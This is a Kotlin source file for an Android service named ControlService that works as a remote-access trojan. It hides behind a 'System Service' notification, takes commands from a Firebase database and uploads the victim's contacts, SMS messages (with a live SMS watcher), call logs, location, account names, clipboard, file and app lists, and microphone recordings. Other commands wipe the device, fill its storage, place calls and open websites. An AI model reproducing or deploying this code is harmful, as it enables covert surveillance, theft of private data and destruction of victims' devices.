package com.crox

import android.accounts.AccountManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.WallpaperManager
import android.app.admin.DevicePolicyManager
import android.bluetooth.BluetoothAdapter
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.CameraManager
import android.location.Location
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.StatFs
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.LocationServices
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.net.URL
import java.util.UUID

class ControlService : android.app.Service() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var deviceId: String
    private val database = FirebaseDatabase.getInstance()
    private var mediaRecorder: MediaRecorder? = null
    private var mediaPlayer: MediaPlayer? = null
    private var smsObserver: ContentObserver? = null

    companion object {
        const val TAG = "ControlService"
        const val CHANNEL_ID = "CroxServiceChannel"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running background synchronization")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()

        startForeground(1, notification)

        val prefs = getSharedPreferences("crox_prefs", Context.MODE_PRIVATE)
        deviceId = prefs.getString("device_id", null) ?: run {
            val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: UUID.randomUUID().toString()
            prefs.edit().putString("device_id", id).apply()
            id
        }

        listenToCommands()
        registerSmsObserver()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Background Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): android.os.IBinder? = null

    private fun pushData(action: String, payload: Any) {
        serviceScope.launch {
            try {
                val dataRef = database.getReference("devices/$deviceId/data").push()
                val map = mapOf(
                    "action" to action,
                    "timestamp" to System.currentTimeMillis(),
                    "payload" to payload
                )
                dataRef.setValue(map)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to push data for $action", e)
            }
        }
    }

    private fun listenToCommands() {
        val commandsRef = database.getReference("devices/$deviceId/commands")
        commandsRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    val commandStr = child.getValue(String::class.java)
                    if (commandStr != null) {
                        handleCommand(commandStr)
                        child.ref.removeValue()
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Command listener cancelled", error.toException())
            }
        })
    }

    private fun handleCommand(cmd: String) {
        serviceScope.launch {
            try {
                val json = JSONObject(cmd)
                val action = json.optString("action")
                val arg = json.optString("arg", "")
                val arg2 = json.optString("arg2", "")

                when (action) {
                    "extractContacts" -> pushData(action, extractContacts())
                    "extractPhotos" -> pushData(action, extractPhotos())
                    "extractCallLogs" -> pushData(action, extractCallLogs())
                    "extractLocation" -> pushData(action, extractLocation())
                    "extractEmails" -> pushData(action, extractEmails())
                    "extractSms" -> pushData(action, extractSms())
                    "extractInternalInfo" -> pushData(action, extractInternalInfo())
                    "extractSystemInfo" -> pushData(action, extractSystemInfo())
                    "extractExternalInfo" -> pushData(action, extractExternalInfo())
                    "extractAudioRecording" -> pushData(action, extractAudioRecording())
                    "extractScreenshot" -> pushData(action, extractScreenshot())
                    "extractPhoneFiles" -> pushData(action, extractPhoneFiles(arg.ifEmpty { "/sdcard/" }))
                    "extractPhoneApplications" -> pushData(action, extractPhoneApplications())
                    "extractClipboard" -> pushData(action, extractClipboard())
                    "formatDevice" -> formatDevice()
                    "toggleWifi" -> toggleWifi(arg.toBoolean())
                    "toggleBluetooth" -> toggleBluetooth(arg.toBoolean())
                    "toggleFlash" -> toggleFlash(arg.toBoolean())
                    "playMusic" -> playMusic()
                    "takeScreenshotAction" -> takeScreenshotAction()
                    "recordAudioAction" -> recordAudioAction()
                    "sendVibration" -> sendVibration()
                    "changeWallpaper" -> changeWallpaper(arg)
                    "openSite" -> openSite(arg)
                    "sendVoiceMessage" -> sendVoiceMessage()
                    "sendToast" -> sendToast(arg)
                    "sendNotification" -> sendNotification(arg, arg2)
                    "makeCall" -> makeCall(arg)
                    "fillDeviceSpace" -> fillDeviceSpace()
                    "changeAppVisuals" -> changeAppVisuals()
                    else -> pushData("unknown", "Unsupported action: $action")
                }
            } catch (e: Exception) {
                pushData("error", e.localizedMessage ?: "Unknown error")
            }
        }
    }

    private fun extractContacts(): String {
        val jsonArray = JSONArray()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext()) {
                val obj = JSONObject()
                obj.put("name", if (nameIdx >= 0) it.getString(nameIdx) else "")
                obj.put("number", if (numIdx >= 0) it.getString(numIdx) else "")
                jsonArray.put(obj)
            }
        }
        return jsonArray.toString()
    }

    private fun extractPhotos(): String {
        val jsonArray = JSONArray()
        val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED)
        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC"
        )
        cursor?.use {
            val dataIdx = it.getColumnIndex(MediaStore.Images.Media.DATA)
            while (it.moveToNext()) {
                if (dataIdx >= 0) {
                    jsonArray.put(it.getString(dataIdx))
                }
            }
        }
        return jsonArray.toString()
    }

    private fun extractCallLogs(): String {
        val jsonArray = JSONArray()
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, CallLog.Calls.DATE + " DESC"
        )
        cursor?.use {
            val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
            val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
            val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)
            while (it.moveToNext()) {
                val obj = JSONObject()
                obj.put("number", if (numIdx >= 0) it.getString(numIdx) else "")
                obj.put("type", if (typeIdx >= 0) it.getInt(typeIdx) else 0)
                obj.put("date", if (dateIdx >= 0) it.getLong(dateIdx) else 0L)
                obj.put("duration", if (durationIdx >= 0) it.getString(durationIdx) else "0")
                jsonArray.put(obj)
            }
        }
        return jsonArray.toString()
    }

    private suspend fun extractLocation(): String = withContext(Dispatchers.IO) {
        try {
            val fusedClient = LocationServices.getFusedLocationProviderClient(this@ControlService)
            var locStr = "Unavailable"
            fusedClient.lastLocation.addOnSuccessListener { location: Location? ->
                if (location != null) {
                    locStr = "Lat: ${location.latitude}, Lng: ${location.longitude}"
                    pushData("extractLocationResult", locStr)
                }
            }
            return@withContext "Requested location update"
        } catch (e: Exception) {
            return@withContext "Error: ${e.message}"
        }
    }

    private fun extractEmails(): String {
        val jsonArray = JSONArray()
        try {
            val manager = AccountManager.get(this)
            val accounts = manager.accounts
            for (acc in accounts) {
                jsonArray.put(acc.name)
            }
        } catch (_: Exception) {}
        return jsonArray.toString()
    }

    private fun extractSms(): String {
        val jsonArray = JSONArray()
        val uri = Uri.parse("content://sms/inbox")
        val cursor = contentResolver.query(uri, null, null, null, "date DESC")
        cursor?.use {
            val addressIdx = it.getColumnIndex("address")
            val bodyIdx = it.getColumnIndex("body")
            val dateIdx = it.getColumnIndex("date")
            while (it.moveToNext()) {
                val obj = JSONObject()
                obj.put("address", if (addressIdx >= 0) it.getString(addressIdx) else "")
                obj.put("body", if (bodyIdx >= 0) it.getString(bodyIdx) else "")
                obj.put("date", if (dateIdx >= 0) it.getLong(dateIdx) else 0L)
                jsonArray.put(obj)
            }
        }
        return jsonArray.toString()
    }

    private fun registerSmsObserver() {
        try {
            smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    pushData("newSmsDetected", uri.toString())
                }
            }
            contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver!!)
        } catch (_: Exception) {}
    }

    private fun extractInternalInfo(): String {
        val stat = StatFs(Environment.getDataDirectory().path)
        val blockSize = stat.blockSizeLong
        val totalBlocks = stat.blockCountLong
        val availableBlocks = stat.availableBlocksLong
        val obj = JSONObject()
        obj.put("totalSpace", totalBlocks * blockSize)
        obj.put("freeSpace", availableBlocks * blockSize)
        return obj.toString()
    }

    private fun extractSystemInfo(): String {
        val obj = JSONObject()
        obj.put("manufacturer", Build.MANUFACTURER)
        obj.put("model", Build.MODEL)
        obj.put("sdk", Build.VERSION.SDK_INT)
        obj.put("release", Build.VERSION.RELEASE)
        return obj.toString()
    }

    private fun extractExternalInfo(): String {
        val externalPath = Environment.getExternalStorageDirectory()
        val stat = StatFs(externalPath.path)
        val obj = JSONObject()
        obj.put("totalSpace", stat.blockCountLong * stat.blockSizeLong)
        obj.put("freeSpace", stat.availableBlocksLong * stat.blockSizeLong)
        return obj.toString()
    }

    private fun extractAudioRecording(): String {
        val file = File(cacheDir, "audio_${System.currentTimeMillis()}.3gp")
        try {
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            Thread.sleep(5000)
            mediaRecorder?.stop()
            mediaRecorder?.release()
            mediaRecorder = null
            val bytes = file.readBytes()
            return Base64.encodeToString(bytes, Base64.DEFAULT)
        } catch (e: Exception) {
            return "Error recording audio: ${e.message}"
        }
    }

    private fun extractScreenshot(): String {
        return "Screenshot capture requires MediaProjection API or root."
    }

    private fun extractPhoneFiles(path: String): String {
        val jsonArray = JSONArray()
        val dir = File(path)
        if (dir.exists() && dir.isDirectory) {
            dir.listFiles()?.forEach { file ->
                val obj = JSONObject()
                obj.put("name", file.name)
                obj.put("isDirectory", file.isDirectory)
                obj.put("size", file.length())
                jsonArray.put(obj)
            }
        }
        return jsonArray.toString()
    }

    private fun extractPhoneApplications(): String {
        val jsonArray = JSONArray()
        val packages = packageManager.getInstalledPackages(0)
        for (pkg in packages) {
            val obj = JSONObject()
            obj.put("packageName", pkg.packageName)
            obj.put("versionName", pkg.versionName)
            jsonArray.put(obj)
        }
        return jsonArray.toString()
    }

    private fun extractClipboard(): String {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = clipboard.primaryClip
        if (clip != null && clip.itemCount > 0) {
            return clip.getItemAt(0).text?.toString() ?: ""
        }
        return ""
    }

    private fun formatDevice() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, BootReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.wipeData(0)
            }
        } catch (_: Exception) {}
    }

    private fun toggleWifi(state: Boolean) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                @Suppress("DEPRECATION")
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                @Suppress("DEPRECATION")
                wifiManager.isWifiEnabled = state
            }
        } catch (_: Exception) {}
    }

    private fun toggleBluetooth(state: Boolean) {
        try {
            val bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
            if (bluetoothAdapter != null) {
                if (state) {
                    @Suppress("MissingPermission")
                    bluetoothAdapter.enable()
                } else {
                    @Suppress("MissingPermission")
                    bluetoothAdapter.disable()
                }
            }
        } catch (_: Exception) {}
    }

    private fun toggleFlash(state: Boolean) {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList[0]
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.setTorchMode(cameraId, state)
            }
        } catch (_: Exception) {}
    }

    private fun playMusic() {
        try {
            if (mediaPlayer == null) {
                mediaPlayer = MediaPlayer.create(this, android.provider.Settings.System.DEFAULT_RINGTONE_URI)
            }
            mediaPlayer?.isLooping = true
            mediaPlayer?.start()
        } catch (_: Exception) {}
    }

    private fun takeScreenshotAction() {}

    private fun recordAudioAction() {
        extractAudioRecording()
    }

    private fun sendVibration() {
        val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val vibratorManager = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
            vibratorManager.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            @Suppress("DEPRECATION")
            vibrator.vibrate(1000)
        }
    }

    private fun changeWallpaper(urlStr: String) {
        serviceScope.launch {
            try {
                val url = URL(urlStr)
                val bitmap = BitmapFactory.decodeStream(url.openConnection().getInputStream())
                val wallpaperManager = WallpaperManager.getInstance(applicationContext)
                wallpaperManager.setBitmap(bitmap)
            } catch (_: Exception) {}
        }
    }

    private fun openSite(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun sendVoiceMessage() {
        playMusic()
    }

    private fun sendToast(msg: String) {
        Handler(Looper.getMainLooper()).post {
            android.widget.Toast.makeText(this, msg, android.widget.Toast.LENGTH_LONG).show()
        }
    }

    private fun sendNotification(title: String, body: String) {
        val notificationManager = getSystemService(NotificationManager::class.java)
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(body)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setAutoCancel(true)
            .build()
        notificationManager?.notify(System.currentTimeMillis().toInt(), notification)
    }

    private fun makeCall(number: String) {
        try {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun fillDeviceSpace() {
        serviceScope.launch {
            try {
                val dir = cacheDir
                for (i in 1..10) {
                    val file = File(dir, "cache_$i.tmp")
                    val fos = FileOutputStream(file)
                    val buffer = ByteArray(1024 * 1024 * 50)
                    fos.write(buffer)
                    fos.close()
                }
            } catch (_: Exception) {}
        }
    }

    private fun changeAppVisuals() {
        try {
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
        mediaPlayer?.release()
        mediaRecorder?.release()
    }
}
